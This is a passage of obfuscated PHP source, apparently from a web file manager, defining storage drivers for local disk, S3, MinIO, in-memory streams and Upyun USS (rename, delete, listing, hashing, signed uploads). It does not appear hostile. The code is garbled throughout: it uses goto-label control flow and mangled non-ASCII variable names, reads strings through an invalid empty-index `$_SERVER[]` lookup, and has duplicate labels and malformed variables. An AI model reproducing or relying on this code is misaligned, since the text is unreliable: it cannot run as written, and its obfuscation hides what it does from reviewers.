intval(@rename($c, $c)); if (!$F) { if ($F = intval(@copy_64($c, $c))) { @unlink($c); } } @chmod($c, $this->pathAuth); goto d; Cܧ: $this->mkdir($this->pathFather($c)); $c = $this->iconvSystem($c); $c = $this->iconvSystem($c); goto aྎ; cߜ: } public function delFile($C) { $C = $this->iconvSystem($C); if (!@unlink($C)) { @chmod($C, $this->pathAuth); if (!@unlink($C)) { return !1; } } else { return !0; } } public function delFolder($b) { goto FἨ; D󊑍: if (!($cۺۍ = opendir($b))) { return !1; } while (($E֢ = readdir($cۺۍ)) !== !1) { if ($E֢ == $f܉ᄧ[95] || $E֢ == $f܉ᄧ[1269]) { continue; } $A = $b . $f܉ᄧ[8] . $E֢; if (is_file($A) || is_link($A)) { if (!unlink($A)) { chmod($A, $this->pathAuth); if (!unlink($A)) { return !1; } } } else { if (is_dir($A)) { chmod($A, $this->pathAuth); $A = $this->iconvApp($A); if (!$this->delFolder($A)) { return !1; } } } } closedir($cۺۍ); goto D뉔; D뉔: return rmdir($b); goto E땣ƙ; FἨ: $f܉ᄧ =& $_SERVER[]; $b = $this->iconvSystem($b); if (!is_dir($b)) { return !0; } goto D󊑍; E땣ƙ: } public function rename($D, $eŮͩ) { goto Bˏ̉ǖ; Bˏ̉ǖ: $c㎴ =& $_SERVER[]; $d = $this->fileNameAuto($this->pathFather($D), $eŮͩ); $d = $this->iconvSystem($d); goto Dƺ; Dƺ: $D = $this->iconvSystem($D); $CƋ݆ = $this->pathFather($D); $d = rtrim($CƋ݆, $c㎴[8]) . $c㎴[8] . $d; goto b; b: $f = @rename($D, $d); $d = $this->iconvApp($d); return $f ? $this->getPathOuter($d) : !1; goto a; a: } public function size($Fէ) { $Fէ = $this->iconvSystem($Fէ); return filesize_64($Fէ); } public function info($C) { $C = $this->iconvSystem($C); if ($this->isFolder($C)) { return $this->folderInfo($C); } else { if ($this->isFile($C)) { return $this->fileInfo($C); } } return !1; } protected function infoChildren($C悞ӓ, &$eك, $B = true) { goto eﶆ; eﶆ: $cؾ =& $_SERVER[]; check_abort_echo(); $C悞ӓ = rtrim($C悞ӓ, $cؾ[8]) . $cؾ[8]; goto fҠ; fҠ: if ($B) { $C悞ӓ = $this->iconvSystem($C悞ӓ); } if (!($aʚނ = @opendir($C悞ӓ))) { return; } while (($f = readdir($aʚނ)) !== !1) { if ($f == $cؾ[95] || $f == $cؾ[1269]) { continue; } $D = $C悞ӓ . $f; if (is_file($D) || is_link($D)) { $eك[$cؾ[79]]++; $eك[$cؾ[78]] += filesize_64($D); } else { if (is_dir($D)) { $eك[$cؾ[80]]++; $this->infoChildren($D, $eك, !1); } } } goto CͰ; CͰ: closedir($aʚނ); goto Bѽ; Bѽ: } private function folderInfo($B, $bָ = false) { $Cǩƈ =& $_SERVER[]; $B = rtrim($B, $Cǩƈ[8]) . $Cǩƈ[8]; $dΏ = $this->iconvApp($this->pathThis($B)); if ($bָ) { return array($Cǩƈ[28] => $dΏ, $Cǩƈ[76] => $this->getPathOuter($B), $Cǩƈ[29] => $Cǩƈ[77]); } $cڇ = array($Cǩƈ[28] => $dΏ, $Cǩƈ[76] => $this->getPathOuter($B), $Cǩƈ[29] => $Cǩƈ[77], $Cǩƈ[194] => @filectime($B), $Cǩƈ[84] => @filemtime($B), $Cǩƈ[1272] => @fileatime($B), $Cǩƈ[1273] => is_readable($B), $Cǩƈ[1274] => is_writable($B), $Cǩƈ[1275] => get_mode($B)); return $cڇ; } private function fileInfo($Eˈ, $C䄗 = false) { $dݖ =& $_SERVER[]; $ạ֠ъ = $this->iconvApp($this->pathThis($Eˈ)); if ($C䄗) { return array($dݖ[28] => $ạ֠ъ, $dݖ[76] => $this->getPathOuter($Eˈ), $dݖ[29] => $dݖ[193], $dݖ[78] => $this->size($Eˈ), $dݖ[168] => $this->ext($ạ֠ъ)); } $A姗 = array($dݖ[28] => $ạ֠ъ, $dݖ[76] => $this->getPathOuter($Eˈ), $dݖ[29] => $dݖ[193], $dݖ[194] => @filectime($Eˈ), $dݖ[84] => @filemtime($Eˈ), $dݖ[1272] => @fileatime($Eˈ), $dݖ[78] => $this->size($Eˈ), $dݖ[168] => $this->ext($ạ֠ъ), $dݖ[1273] => is_readable($Eˈ), $dݖ[1274] => is_writable($Eˈ), $dݖ[1275] => get_mode($Eˈ)); return $A姗; } public function exist($D𲃽) { $D𲃽 = $this->iconvSystem($D𲃽); return @file_exists($D𲃽); } public function isFile($E) { $E = $this->iconvSystem($E); return @is_file($E); } public function isFolder($A­ͥ) { $A­ͥ = $this->iconvSystem($A­ͥ); return @is_dir($A­ͥ); } public function listPath($e֞, $cŔȆ = false) { goto fג; fג: $c즎 =& $_SERVER[]; $e֞ = $this->iconvSystem($e֞); $e֞ = rtrim($e֞, $c즎[8]) . $c즎[8]; goto E؄; a؆: closedir($Fȗ); return $C顏; goto aĶ; E؄: $C顏 = array($c즎[75] => array(), $c즎[74] => array()); if (!($Fȗ = @opendir($e֞))) { return $C顏; } while (($E߷ۆ = readdir($Fȗ)) !== !1) { if ($E߷ۆ == $c즎[95] || $E߷ۆ == $c즎[1269]) { continue; } $aȷ = $e֞ . $E߷ۆ; if (is_file($aȷ)) { $C顏[$c즎[74]][] = $this->fileInfo($aȷ, $cŔȆ); } else { $C顏[$c즎[75]][] = $this->folderInfo($aȷ, $cŔȆ); } } goto a؆; aĶ: } public function listAll($Eč, &$Fד = array()) { goto c٤; c٤: $a =& $_SERVER[]; $Eč = $this->iconvSystem($Eč); $Eč = rtrim($Eč, $a[8]) . $a[8]; goto Eǝ͙; d܄ζ: return $Fד; goto dƟ; Eǝ͙: if (!($F׾ۏ = @opendir($Eč))) { return $Fד; } while (($a = readdir($F׾ۏ)) !== !1) { if ($a == $a[95] || $a == $a[1269]) { continue; } $bӏ = $Eč . $a; if (is_dir($bӏ) && !is_link($bӏ)) { $Fד[] = array($a[76] => $bӏ . $a[8], $a[77] => 1, $a[84] => @filemtime($bӏ), $a[78] => 0); $this->listAll($bӏ, $Fד); } else { $Fד[] = array($a[76] => $bӏ, $a[77] => 0, $a[84] => @filemtime($bӏ), $a[78] => $this->size($bӏ)); } } closedir($F׾ۏ); goto d܄ζ; dƟ: } public function has($eݝ, $Cߞ = false, $f䏤 = true) { goto e; d: if ($Cߞ) { return array($Eή[203] => $a弭, $Eή[204] => $d֭); } return !1; goto cי; Bǅԙ: if (!($BЧ᠟ = @opendir($eݝ))) { return !1; } $a弭 = 0; $d֭ = 0; goto d; d: $fɟ = 0; while (($aÜ = readdir($BЧ᠟)) !== !1) { if ($aÜ == $Eή[95] || $aÜ == $Eή[1269]) { continue; } $dڪ = $eݝ . $aÜ; if ($Cߞ) { $fɟ++; if (@is_file($dڪ)) { $a弭++; } else { $d֭++; } if ($fɟ > 10000) { break; } continue; } if ($f䏤) { if (@is_file($dڪ)) { return !0; } } else { if (@is_dir($dڪ . $Eή[8])) { return !0; } } } closedir($BЧ᠟); goto d; e: $Eή =& $_SERVER[]; $eݝ = $this->iconvSystem($eݝ); $eݝ = rtrim($eݝ, $Eή[8]) . $Eή[8]; goto Bǅԙ; cי: } public function hashSimple($FŻ) { goto d; d: $b =& $_SERVER[]; if (!$FŻ) { return md5($b[33]); } $FŻ = $this->iconvSystem($FŻ); goto c݇; f: if ($Bٌ <= $ađ * $e) { return $this->hashMd5($FŻ) . $Bٌ; } $cΞˈ = $b[33]; $B = intval($Bٌ / $e); goto bم; EԾ: return md5($cΞˈ) . $Bٌ; goto DĲ; Bǆ: fseek_64($E, $Bٌ - $ađ); $cΞˈ .= fread($E, $ađ); fclose($E); goto EԾ; c݇: $Bٌ = $this->size($FŻ); $ađ = 200; $e = 50; goto f; bم: $E = fopen($FŻ, $b[1276]); if (!$E) { return $cΞˈ; } for ($eΨ = 0; $eΨ < $e; $eΨ++) { fseek_64($E, $B * $eΨ); $cΞˈ .= fread($E, $ađ); } goto Bǆ; DĲ: } public function getContent($dʜن޳) { $dʜن޳ = $this->iconvSystem($dʜن޳); return file_get_contents($dʜن޳); } public function setContent($A, $dּͦ = '') { $A = $this->iconvSystem($A); $E䭣 = @file_put_contents($A, $dּͦ, LOCK_EX); clearstatcache(); @chmod($A, $this->pathAuth); return $E䭣 === !1 ? !1 : !0; } public function fileSubstr($cڿ쏷, $aˉ = 0, $F = false) { goto DԌ; fΊ: fseek_64($dʣ, $aˉ); $bϷ = fread($dʣ, $F); fclose($dʣ); goto cۈ; cۈ: return $bϷ; goto F; DԌ: $aڛ =& $_SERVER[]; $cڿ쏷 = $this->iconvSystem($cڿ쏷); if ($F === !1) { $F = $this->size($cڿ쏷); } goto A뢎; A뢎: if ($F <= 0) { return $aڛ[33]; } $dʣ = fopen($cڿ쏷, $aڛ[1276]); if (!$dʣ) { return !1; } goto fΊ; F: } public function upload($Fܞ, $Bʤ, $fЍ = false, $dƽȇ = REPEAT_REPLACE) { if ($fЍ) { return $this->moveFile($Bʤ, $Fܞ); } return $this->copyFile($Bʤ, $Fܞ); } public function setModifyTime($c߈, $fʳ = '') { @touch($c߈, intval($fʳ)); } public function download($bͶڸ, $c) { return $this->iconvSystem($bͶڸ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($eʝ) { parent::__construct($eʝ); $this->signatureVersion($_SERVER[][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto f֠ʉ; D: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($e) { parent::__construct($e); } public function uploadFormData($aȫ, $A = 3600) { goto F떸; A: $e푲 = $Aܚ[1243]; $Fٱ = $A . $Aܚ[33]; $D˭ = $Aܚ[1206]; goto f糖ߢ; d: $b = array($Aܚ[211] => $Aܚ[33], $Aܚ[1253] => $Aܚ[33], $Aܚ[1210] => $Aź, $Aܚ[1214] => $D˭, $Aܚ[1218] => $eΘ, $Aܚ[1254] => $D, $Aܚ[1255] => $c̒, $Aܚ[1256] => $BՌ, $Aܚ[1257] => $Fٱ, $Aܚ[1258] => $c, $Aܚ[175] => $this->getHost()); return $b; goto d领; F떸: $Aܚ =& $_SERVER[]; $Aź = $Aܚ[192]; $c̒ = $Aܚ[1241]; goto B; B: $c = $Aܚ[59]; $BՌ = gmdate($Aܚ[1242]); $A = gmdate($Aܚ[728]); goto A; d߃: $F = hash_hmac($Aܚ[1251], $c, $C, !0); $e鄽 = hash_hmac($Aܚ[1251], $e푲, $F, !0); $c = hash_hmac($Aܚ[1251], $eΘ, $e鄽); goto d; Eև: $eΘ = base64_encode(json_encode($E)); $fʽ = hash_hmac($Aܚ[1251], $A, $Aܚ[1252] . $this->secret, !0); $C = hash_hmac($Aܚ[1251], $this->region, $fʽ, !0); goto d߃; f糖ߢ: $c­ = array($this->accessKey, $A, $this->region, $c, $e푲); $D = implode($Aܚ[8], $c­); $E = array($Aܚ[1208] => gmdate($Aܚ[1207], strtotime($Aܚ[1244])), $Aܚ[1209] => array(array($Aܚ[1211] => $this->bucket), array($Aܚ[1210] => $Aź), array($Aܚ[1212], $Aܚ[1213], $Aܚ[33]), array($Aܚ[1212], $Aܚ[1245], $Aܚ[33]), array($Aܚ[1212], $Aܚ[1246], $Aܚ[33]), array($Aܚ[1214] => $D˭), array($Aܚ[1247] => $D), array($Aܚ[1248] => $c̒), array($Aܚ[1249] => $BՌ), array($Aܚ[1250] => $Fٱ))); goto Eև; d领: } public function multiUploadFormData($Aڅ㆟, $bοޕ = 3600) { $d =& $_SERVER[]; $Bҿ = gmdate($d[1335]); $C = array(); $Eط = $this->client->getUploadId($this->bucket, $Aڅ㆟, $C); if (!$Eط) { return !1; } return array($d[221] => $Eط, $d[175] => $this->getHost() . $d[8] . $this->pathEncode($Aڅ㆟), $d[222] => $Bҿ, $d[93] => $Aڅ㆟); } public function multiUploadAuthData($eᮑ, $Eۣ = array()) { goto eñ; Cꩋ: if (isset($Eۣ[$A[1336]])) { $c߆[$A[1337]] = $Eۣ[$A[1336]]; } $d = explode($A[177], $this->getHost()); $bμ = array($A[1338] => $d[1], $A[1339] => $A[33], $A[211] => $A[119], $A[1253] => $Eۣ[$A[78]]); goto DЃԎ; e϶: if (strpos($f, $A[225]) === 0) { if (isset($c߆[$A[1337]])) { $Dؐ = $c߆[$A[1337]]; } else { if (isset($cЂ[$A[1337]])) { $Dؐ = $cЂ[$A[1337]]; } else { $Dؐ = hash($A[1251], $A[33]); } } return array($A[232] => $cЂ[$A[232]], $A[1337] => $Dؐ, $A[222] => $cЂ[$A[1340]]); } return $cЂ[$A[232]]; goto a; Aכ: unset($Eۣ[$A[93]]); if (isset($Eۣ[$A[223]])) { return $this->listUploadParts($aѶ, $Eۣ); } $c߆ = array(); goto Cꩋ; eñ: $A =& $_SERVER[]; $f = isset($Eۣ[$A[168]]) ? $Eۣ[$A[168]] : $A[33]; $aѶ = $Eۣ[$A[93]]; goto Aכ; DЃԎ: $A = $A[226]; $E = $A[8] . $this->pathEncode($aѶ) . $f; $cЂ = $this->client->__getSignatureV4($c߆, $bμ, $A, $E); goto e϶; a: } public function listUploadParts($a٫, $F = array()) { goto c̜; c̜: $cϳ۞ =& $_SERVER[]; $F = str_replace($cϳ۞[233], $cϳ۞[33], $F[$cϳ۞[168]]); $f͐ = $this->client->listParts($this->bucket, $a٫, $F); goto C; dܗ: $b޸ .= $cϳ۞[1344]; $b܅ֆ = array(); $Aź = explode($cϳ۞[177], $this->getHost()); goto E➋; C: if (!$f͐) { return !1; } $b޸ = $cϳ۞[1341]; foreach ($f͐ as $eǑ) { $b޸ .= $cϳ۞[1342] . "\x3c\x50\141\162\164\116\x75\x6d\142\x65\x72\76{$eǑ[$cϳ۞[1298]]}\x3c\x2f\120\x61\x72\164\116\165\155\142\x65\x72\x3e\12" . "\x3c\x45\124\141\147\x3e{$eǑ[$cϳ۞[1299]]}\x3c\x2f\105\x54\141\147\x3e\12" . $cϳ۞[1343]; } goto dܗ; Aޚ: $Aￗ = $this->client->__getSignatureV4($b܅ֆ, $dآ, $A͝, $Dݐ, $b޸); return array($cϳ۞[232] => $Aￗ[$cϳ۞[232]], $cϳ۞[222] => $Aￗ[$cϳ۞[1340]], $cϳ۞[234] => $f͐, $cϳ۞[1337] => $Aￗ[$cϳ۞[1337]]); goto B㒊; E➋: $dآ = array($cϳ۞[1338] => $Aź[1], $cϳ۞[211] => $cϳ۞[119], $cϳ۞[1253] => strlen($b޸)); $A͝ = $cϳ۞[224]; $Dݐ = $cϳ۞[8] . $this->pathEncode($a٫) . $F[$cϳ۞[168]]; goto Aޚ; B㒊: } public function link($d󩔌, $fՠϪ = array()) { return parent::link($d󩔌, $fՠϪ); } public function fileOut($a, $A = false, $Aܢ = false, $F = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[][1345])) { return parent::fileOutServer($a, $A, $Aܢ, $F); } parent::fileOut($a, $A, $Aܢ, $F); } public function fileOutImage($Dث̜, $c냚 = 250) { if (strstr($this->endpoint, $_SERVER[][1345])) { return parent::fileOutImageServer($Dث̜, $c냚); } parent::fileOutImage($Dث̜, $c냚); } public function fileOutLink($Bݍ) { $Cȗ =& $_SERVER[]; if (substr($Bݍ, 0, 7) == $Cȗ[1221]) { $Bݍ = $Cȗ[1222] . substr($Bݍ, 7); } header($Cȗ[159] . $Bݍ); die; } public function getHost() { $cӖ =& $_SERVER[]; $F΂ = str_rtrim(parent::getHost(), $cӖ[8] . $this->bucket); $F΂ = explode($cӖ[177], $F΂); return $F΂[0] . $cӖ[177] . $this->bucket . $cӖ[95] . $F΂[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($E, $b叮 = 0) { parent::__construct(); $this->source = $E; $this->sourceSize = $b叮; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($A댇 = false) { return $this->sourceSize; } public function getContent($fןڋ = false) { return $this->fileSubstr($fןڋ, 0, $this->sourceSize); } public function fileSubstr($B = false, $f = 0, $bĪ = 0) { if (!$bĪ) { $bĪ = $this->sourceSize; } $c = $this->sourceSize - $f; if ($bĪ >= $c) { $bĪ = $c; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $f, $bĪ); } if ($this->sourceType == self::TYPE_FILE) { if ($bĪ <= 0) { return $_SERVER[][33]; } $B = ftell($this->source); fseek_64($this->source, $B + $f); $Aٌ = @fread($this->source, $bĪ); fseek_64($this->source, $B); return $Aٌ; } } public function hashMd5($Dշľ = false) { return md5($this->getContent()); } public static function hash($fڲ, $dƋ = 0) { $d = new PathDriverStream($fڲ, $dƋ); return $d->hashSimple($fڲ); } public static function md5($fŚب, $c = 0) { $eƽ = new PathDriverStream($fŚب, $c); return $eƽ->hashMd5($fŚب); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\57\57\166\x30\x2e\x61\160\151\56\165\160\171\165\x6e\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($fߊˑ) { parent::__construct(); $this->_init($fߊˑ); } public function _init($f) { $b =& $_SERVER[]; foreach ($f as $Eӯǉ => $c) { if (isset($this->{$Eӯǉ})) { $this->{$Eӯǉ} = $c; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($b[1346] . LNG($b[1279])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($D鹣, $BŸ = "\107\x45\x54") { $d =& $_SERVER[]; $bǨ = gmdate($d[1312]); $bޟ = base64_encode(hash_hmac($d[1347], "{$BŸ}\x26{$D鹣}\x26{$bǨ}", md5("{$this->userpass}"), !0)); $cӬ = array("\x41\x75\x74\150\157\x72\x69\x7a\x61\x74\x69\x6f\156\x3a\125\x50\x59\x55\116\40{$this->username}\x3a{$bޟ}", "\104\x61\164\145\72{$bǨ}"); return $cӬ; } public function ussRequest($dț, $Aߧھ = "\x47\x45\x54", $Bڥ = false, $Aȍ = false, $a݇ = false) { goto DǍ; DǍ: $Bٽ =& $_SERVER[]; $dț = trim($dț, $Bٽ[8]); $aק = "\57{$this->bucket}\57{$dț}"; goto C; d܃: if (!$Eڦ) { return array($Bٽ[1103] => !1, $Bٽ[1105] => $Bٽ[1348]); } if (strtolower($Aߧھ) == $Bٽ[190] || in_array($Eڦ[$Bٽ[1103]], array($Bٽ[1206], $Bٽ[1349]))) { $Bڥ = $Eڦ[$Bٽ[1350]]; } else { $Bڥ = json_decode($Eڦ[$Bٽ[1105]], !0); if (!$Bڥ) { $Bڥ = $Eڦ[$Bٽ[1105]]; } else { if (!$Eڦ[$Bٽ[727]] && isset($Bڥ[$Bٽ[1351]])) { $Bڥ = $Bڥ[$Bٽ[1351]]; } } } return array($Bٽ[1103] => $Eڦ[$Bٽ[727]], $Bٽ[1105] => $Bڥ); goto Bǒ; C: $E = $this->ussHeaders($aק, $Aߧھ); if ($Aȍ) { $E = array_merge($E, $Aȍ); } $Eڦ = url_request($this->endpoint . $aק, $Aߧھ, $Bڥ, $E, $a݇); goto d܃; Bǒ: } public function mkfile($Dҩ, $fƖ܌ = '', $CƔ = REPEAT_RENAME) { if ($this->setContent($Dҩ, $fƖ܌)) { return $this->getPathOuter($Dҩ); } return !1; } public function mkdir($FӬ˩, $Cǭ = REPEAT_SKIP) { $d =& $_SERVER[]; $Fܴ = trim($FӬ˩, $d[8]); if ($this->_isFolder($Fܴ)) { return $this->getPathOuter($Fܴ); } $B≉ = array($d[1352]); $B搇 = $this->ussRequest($Fܴ, $d[224], !1, $B≉); return $B搇[$d[1103]] ? $this->getPathOuter($Fܴ) : !1; } public function copyFile($e۳, $fҕ) { $E =& $_SERVER[]; $Eٸ = array($E[1353] . "\57{$this->bucket}\57{$e۳}", $E[1354]); $Eݦ = $this->ussRequest($fҕ, $E[226], !1, $Eٸ); return $Eݦ[$E[1103]] ? !0 : $this->getPathOuter($fҕ); } public function moveFile($a, $Cʲ։) { $Fͨᓲ =& $_SERVER[]; $bČԾԪ = array($Fͨᓲ[1355] . "\x2f{$this->bucket}\57{$a}", $Fͨᓲ[1354]); $E֌Ǫ = $this->ussRequest($Cʲ։, $Fͨᓲ[226], !1, $bČԾԪ); return $E֌Ǫ[$Fͨᓲ[1103]] ? !0 : $this->getPathOuter($Cʲ։); } public function delFile($A۵) { $E =& $_SERVER[]; $C趒 = $this->ussRequest($A۵, $E[1356]); return $C趒[$E[1103]] ? !0 : !1; } public function delFolder($Aֽ) { goto c̭; c: $Bֲ = $Fڄˈ = array(); $this->fileList($Aֽ, $Bֲ, $Fڄˈ, !0); $this->listItemCache = !0; goto e䊂; b: return $aҼ[$dѷƈ[1103]]; goto bꏄ; e䊂: foreach ($Fڄˈ as $eޔ׋) { $aҼ = $this->ussRequest($eޔ׋[$dѷƈ[28]], $dѷƈ[1356]); if (!$aҼ[$dѷƈ[1103]]) { return !1; } } foreach ($Bֲ as $aع) { $aҼ = $this->ussRequest($aع, $dѷƈ[1356]); if (!$aҼ[$dѷƈ[1103]]) { return !1; } } $aҼ = $this->ussRequest($Aֽ, $dѷƈ[1356]); goto b; c̭: $dѷƈ =& $_SERVER[]; if (!$this->exist($Aֽ)) { return !0; } $this->listItemCache = !1; goto c; bꏄ: } public function rename($d֓, $c) { if ($this->isFile($d֓)) { $c = get_path_father($d֓) . $c; return $this->moveFile($d֓, $c); } return $this->renameObject($d֓, $c); } public function fileInfo($B, $b㤒ɂ = false, $f͓ҍ = array()) { goto C; bŻ: $Aλ[$A[194]] = intval($f͓ҍ[$A[1357]]); $Aλ[$A[84]] = intval($f͓ҍ[$A[1358]]); $Aλ[$A[78]] = $f͓ҍ[$A[78]]; goto CŶ; C: $A =& $_SERVER[]; $Aλ = array($A[28] => $this->pathThis($B), $A[76] => $this->getPathOuter($A[8] . $B), $A[29] => $A[193], $A[78] => isset($f͓ҍ[$A[78]]) ? $f͓ҍ[$A[78]] : 0, $A[168] => $this->ext($B)); if ($b㤒ɂ) { return $Aλ; } goto E; E: $Aλ[$A[194]] = $Aλ[$A[84]] = 0; $Aλ[$A[195]] = $Aλ[$A[196]] = !0; if (empty($f͓ҍ)) { $f͓ҍ = $this->objectMeta($B); if (!$f͓ҍ) { return $Aλ; } } goto bŻ; CŶ: return $Aλ; goto E⨄; E⨄: } public function folderInfo($D߱ٓ, $aڟ֊ = false) { goto eǈ䕹; eǈ䕹: $Aӷ =& $_SERVER[]; $AÔ = array($Aӷ[28] => $this->pathThis($D߱ٓ), $Aӷ[76] => $this->getPathOuter($Aӷ[8] . $D߱ٓ), $Aӷ[29] => $Aӷ[77]); if ($aڟ֊) { return $AÔ; } goto Aŏ; E̝: $AÔ[$Aӷ[194]] = intval($A[$Aӷ[1357]]); $AÔ[$Aӷ[84]] = intval($A[$Aӷ[1358]]); return $AÔ; goto F酴; Aŏ: $AÔ[$Aӷ[194]] = $AÔ[$Aӷ[84]] = 0; $AÔ[$Aӷ[195]] = $AÔ[$Aӷ[196]] = !0; if (empty($A)) { $A = $this->objectMeta($D߱ٓ); if (!$A) { return $AÔ; } } goto E̝; F酴: } private function listObjs($B, $cò = 0, $Bڙ = 1000) { $BƑ =& $_SERVER[]; $cׄ = array($BƑ[1359], $BƑ[1360] . $Bڙ); if ($cò) { $cׄ[] = $BƑ[1361] . $cò; } $f = $this->ussRequest($B, $BƑ[228], !1, $cׄ); return !$f[$BƑ[1103]] ? !1 : $f[$BƑ[1105]]; } private function fileList($cϊ, &$F̵, &$d, $bվǠ = false) { goto Cږ͂; Cږ͂: $dĦ =& $_SERVER[]; $e; = $dĦ[33]; $Aƻ֔ = 1000; goto Aӂ; Aӂ: $a = rtrim($cϊ, $dĦ[8]) . $dĦ[8]; $c = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $C = $this->listObjs($cϊ, $e;, $Aƻ֔); if (!$C) { return !1; } $e; = isset($C[$dĦ[1362]]) ? $C[$dĦ[1362]] : $dĦ[33]; $c = isset($C[$dĦ[1363]]) ? $C[$dĦ[1363]] : array(); foreach ($c as $AƋٞ) { $C = $AƋٞ[$dĦ[29]] == $dĦ[77] ? !0 : !1; $aч = ltrim($a . $AƋٞ[$dĦ[28]], $dĦ[8]) . ($C ? $dĦ[8] : $dĦ[33]); $eշ = array($dĦ[28] => $aч, $dĦ[29] => $C ? $dĦ[77] : $dĦ[193], $dĦ[78] => $AƋٞ[$dĦ[335]], $dĦ[1358] => $AƋٞ[$dĦ[1364]]); if ($c) { $this->cacheMethod($dĦ[199], $aч, $C); $this->cacheMethod($dĦ[200], $aч, $eշ); } if ($C) { $F̵[] = $aч; if ($bվǠ) { $this->fileList($aч, $F̵, $d, $bվǠ); } continue; } $d[] = $eշ; } if (count($c) < $Aƻ֔) { break; } } goto e̱; e̱: if ($c) { $this->cacheMethod($dĦ[199], $cϊ, !0); } goto c; c: } public function listPath($Bĭ, $D = false) { $FČ纒 =& $_SERVER[]; $e؆ = $f侙 = array(); $this->fileList($Bĭ, $e؆, $f侙); foreach ($e؆ as $F => $eʊ) { $e؆[$F] = $this->folderInfo($eʊ, $D); } foreach ($f侙 as $F => $eʊ) { $f侙[$F] = $this->fileInfo($eʊ[$FČ纒[28]], $D, $eʊ); } return array($FČ纒[75] => $e؆, $FČ纒[74] => $f侙); } public function has($e띳, $F᎗ = false, $d͔ = true) { goto eնԝ; eȌ: while (!0) { check_abort(); $c肇 = $this->listObjs($e띳, $A٣, $A׶Փ); if (!$c肇) { return !1; } $A٣ = isset($c肇[$Eۭ[1362]]) ? $c肇[$Eۭ[1362]] : $Eۭ[33]; $aٚҐ = isset($c肇[$Eۭ[1363]]) ? $c肇[$Eۭ[1363]] : array(); if (empty($aٚҐ)) { break; } $C = array_filter($aٚҐ, function ($B) { $bэ =& $_SERVER[]; return $B[$bэ[29]] == $bэ[77]; }); $E = count($aٚҐ); $C = count($C); $f񧌹 = $E - $C; if ($F᎗) { $C += $C; $DɃ += $f񧌹; if ($E < $A׶Փ) { break; } continue; } if ($d͔) { if ($f񧌹) { return !0; } } else { if ($C) { return !0; } } if ($E < $A׶Փ) { break; } } if ($F᎗) { return array($Eۭ[203] => $DɃ, $Eۭ[204] => $C); } return !1; goto f; Fƭو: $DɃ = 0; $C = 0; $Aؚߚ = rtrim($e띳, $Eۭ[8]) . $Eۭ[8]; goto eȌ; eնԝ: $Eۭ =& $_SERVER[]; $A٣ = $Eۭ[33]; $A׶Փ = 500; goto Fƭو; f: } public function listAll($Aό) { goto F; F: $a؝ㅄ =& $_SERVER[]; $e쯄 = $Fߛ = array(); $this->fileList($Aό, $e쯄, $Fߛ, !0); goto C; C: $fԕ = array(); foreach ($Fߛ as $d޵) { $fԕ[$d޵[$a؝ㅄ[28]]] = $d޵[$a؝ㅄ[78]]; } foreach ($e쯄 as $d޵) { if (is_string($d޵)) { $fԕ[$d޵] = 0; } } goto Bѥ; Bѥ: return $this->listAllFiles($Aό, array_keys($fԕ), $fԕ); goto cÑ̏ܺ; cÑ̏ܺ: } public function canRead($D) { return $this->exist($D) ? !0 : !1; } public function canWrite($bڿ) { return $this->exist($bڿ) ? !0 : !1; } public function getContent($a) { return $this->fileSubstr($a, 0, -1); } public function setContent($Cޏ, $C = '') { $D܆Ѕ =& $_SERVER[]; if (!$C) { $D̪Ź = $this->ussRequest($Cޏ, $D܆Ѕ[224]); return $D̪Ź[$D܆Ѕ[1103]]; } $F㢖 = $this->tempFile($this->pathThis($Cޏ)); file_put_contents($F㢖, $C); if ($this->upload($Cޏ, $F㢖)) { $this->tempFileRemve($F㢖); return !0; } return !1; } public function fileSubstr($D˴䈢, $dʷ, $c) { $eɉ =& $_SERVER[]; if (!($Fӡ = $this->link($D˴䈢))) { return !1; } $e݉ = !1; if ($c > 0) { $E = $dʷ + $c - 1; $e݉ = array($eɉ[1325] . $dʷ . $eɉ[454] . $E); } $eډ = url_request($Fӡ, $eɉ[228], !1, $e݉); return $eډ[$eɉ[727]] ? $eډ[$eɉ[1105]] : !1; } public function upload($aČ, $f˸, $d쵕 = false, $d޴ = REPEAT_REPLACE) { goto DՊ; DՊ: $Cك٘ =& $_SERVER[]; $a˅ = IO::size($f˸); if ($a˅ <= 1024 * 1024 * 200) { $a = array($Cك٘[1365] . $f˸); $d = $this->ussRequest($aČ, $Cك٘[226], $a); return $d[$Cك٘[1103]] ? $this->getPathOuter($aČ) : !1; } goto f̈; a¥: if (!$d[$Cك٘[1103]]) { return !1; } $e荃䋂 = $d[$Cك٘[1105]]; $c֤ = 0; goto d՞; AΛ: $d = $this->ussRequest($aČ, $Cك٘[226], !1, $b); return $d[$Cك٘[1103]] ? $this->getPathOuter($eί) : !1; goto F; d՞: $c = $e荃䋂[$Cك٘[1370]]; $dݸƝ݌ = fopen($f˸, $Cك٘[1276]); if (!$dݸƝ݌) { return !1; } goto E㷮; f̈: $e = 1024 * 1024 * 10; $b = array($Cك٘[1366], $Cك٘[1367] . $a˅, $Cك٘[1368], $Cك٘[1369] . $e); $d = $this->ussRequest($aČ, $Cك٘[226], !1, $b); goto a¥; E㷮: do { $C޲ʾ = $e荃䋂[$Cك٘[1371]]; fseek_64($dݸƝ݌, $c֤); $eƸ޷ = fread($dݸƝ݌, $C޲ʾ); $Cˉ = 0; do { $Cˉ++; $e荃䋂 = $this->uploadPart($aČ, $e荃䋂, $eƸ޷); } while (!$e荃䋂 && $Cˉ < 3); if (!$e荃䋂) { return !1; } $c = $e荃䋂[$Cك٘[1370]]; $c֤ += $C޲ʾ; } while ($c != -1); fclose($dݸƝ݌); $b = array($Cك٘[1372], $Cك٘[1373] . $e荃䋂[$Cك٘[1374]], $Cك٘[1368]); 